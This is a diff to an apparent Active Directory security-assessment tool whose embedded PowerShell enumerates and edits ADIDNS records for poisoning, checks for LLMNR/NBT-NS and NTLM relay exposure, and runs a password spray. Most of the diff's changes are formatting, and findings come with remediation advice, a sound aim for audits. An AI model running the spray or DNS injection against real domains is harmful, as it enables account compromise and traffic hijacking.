@@ -18758,7 +18758,7 @@ foreach ($z in $zones) {
 }
 Write-Output ""
 # Enumerate records in primary zone
-$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
 Write-Output "=== Records in $primaryZone ==="
 $searcher.SearchRoot = [ADSI]"LDAP://DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
 $searcher.Filter = "(objectClass=dnsNode)"
@@ -18803,7 +18803,7 @@ Write-Output "=== ADIDNS Permission Check ==="
 Write-Output ""
 $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 $dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
-$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
 $zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
 Write-Output "Checking: $zoneDN"
 Write-Output ""
@@ -18863,7 +18863,7 @@ Write-Output "Type: ${recordType}"
 Write-Output ""
 $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 $dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
-$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
 $zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
 # Check if record already exists
 $existingDN = "DC=${name},$zoneDN"
@@ -18935,7 +18935,7 @@ Write-Output "This is the ADIDNS equivalent of LLMNR/NBT-NS poisoning"
 Write-Output ""
 $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 $dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
-$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
 $zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
 try {
   $zoneObj = [ADSI]"LDAP://$zoneDN"
@@ -18974,7 +18974,7 @@ try {
 Write-Output "=== ADIDNS Record Deletion ==="
 $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 $dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
-$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+$primaryZone = ${zone ? `'${zone}'` : "$domain.Name"}
 $recordDN = "DC=${name},DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
 try {
   $record = [ADSI]"LDAP://$recordDN"
@@ -19465,7 +19465,11 @@ else { Write-Output "[+] $vulnCount protocol(s) available for poisoning" }
 `
     const r = await ps(script, timeout)
     output.push(r.stdout)
-    if (r.stdout.includes("LLMNR enabled") || r.stdout.includes("NBT-NS enabled") || r.stdout.includes("mDNS enabled")) {
+    if (
+      r.stdout.includes("LLMNR enabled") ||
+      r.stdout.includes("NBT-NS enabled") ||
+      r.stdout.includes("mDNS enabled")
+    ) {
       findings.push({
         checkId: "POISON-001",
         provider: "winhook",
@@ -19722,8 +19726,10 @@ Write-Output "Check for: $($httpTargets -join ', ')"
         status: "FAIL",
         resource: "Domain Computers",
         title: `${relayableMatch[1]} hosts with SMB signing not required`,
-        details: "These hosts can be targeted for NTLM relay attacks — captured NTLM auth can be relayed to create sessions",
-        remediation: "Enable SMB signing via GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options.",
+        details:
+          "These hosts can be targeted for NTLM relay attacks — captured NTLM auth can be relayed to create sessions",
+        remediation:
+          "Enable SMB signing via GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options.",
       })
     }
     if (r.stdout.includes("LDAP relay possible")) {
@@ -19959,15 +19965,18 @@ if ($fgpp.Count -gt 0) {
       output.push("ERROR: --password required for spray action")
       return { output: output.join("\n"), findings }
     }
-    const dcParam = dc ? `$dc = '${dc}'` : `$dc = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name`
-    const userFilter = users === "all"
-      ? `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"`
-      : `$userList = Get-Content '${users}'; $searcher = $null`
+    const dcParam = dc
+      ? `$dc = '${dc}'`
+      : `$dc = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name`
+    const userFilter =
+      users === "all"
+        ? `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"`
+        : `$userList = Get-Content '${users}'; $searcher = $null`
     const script = `
 ${dcParam}
 Write-Output "=== Password Spray ==="
 Write-Output "Target DC: $dc"
-Write-Output "Password: ${'*'.repeat(8)}"
+Write-Output "Password: ${"*".repeat(8)}"
 Write-Output "Jitter: ${jitter}s between attempts"
 Write-Output "Threshold Margin: ${margin}"
 Write-Output ""
